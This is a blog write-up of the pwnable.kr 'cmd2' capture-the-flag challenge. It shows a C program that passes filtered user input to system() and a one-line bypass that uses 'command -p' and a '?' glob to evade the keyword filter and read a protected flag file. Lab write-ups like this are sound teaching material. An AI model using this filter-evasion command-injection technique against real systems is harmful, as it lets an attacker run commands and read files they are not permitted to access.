---
layout: post
title: pwnable.kr - cmd2
---

## Prompt
Daddy bought me a system command shell.
but he put some filters to prevent me from playing with it without his permission...
but I wanna play anytime I want!

ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)

## Files
We are given an executable `cmd2`, its source `cmd2.c`, and a `flag` file.

**cmd2.c**:
```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}
```
This time the filtering is more serious. We can no longer specify the path of `cat`, but "flag" is still easy to bypass. 

```
cmd2@pwnable:~$ ./cmd2 "cat fla?"
cat fla?
sh: 1: cat: not found
```
Let's check the manual page for `sh`, looking for mentions of `PATH`.

```md
**Path Search**
 When locating a command, the shell
 first looks to see if it has a shell
 function by that name.  Then it looks
 for a builtin command by that name.  If
 a builtin command is not found, one of
 two things happen:

 1.   Command names containing a slash
      are simply executed without per‐
      forming any searches.

 2.   The shell searches each entry in
      PATH in turn for the command.  The
      value of the PATH variable should
      be a series of entries separated
      by colons.  Each entry consists of
      a directory name.  The current
      directory may be indicated implic‐
      itly by an empty directory name,
      or explicitly by a single period.
[...]
**Builtins**
[...]
 command [-p] [-v] [-V] command [arg
        ...]
        Execute the specified command
        but ignore shell functions when
        searching for it.  (This is use‐
        ful when you have a shell func‐
        tion with the same name as a
        builtin command.)

        -p     search for command using
               a PATH that guarantees to
               find all the standard
               utilities.
```
Let's give `command` a shot:
```
cmd2@pwnable:~$ command -p echo a
a
cmd2@pwnable:~$ command -p cat flag
cat: flag: Permission denied
```
## Solution

```
cmd2@pwnable:~$ ./cmd2 "command -p cat fla?"
command -p cat fla?
{flag}
```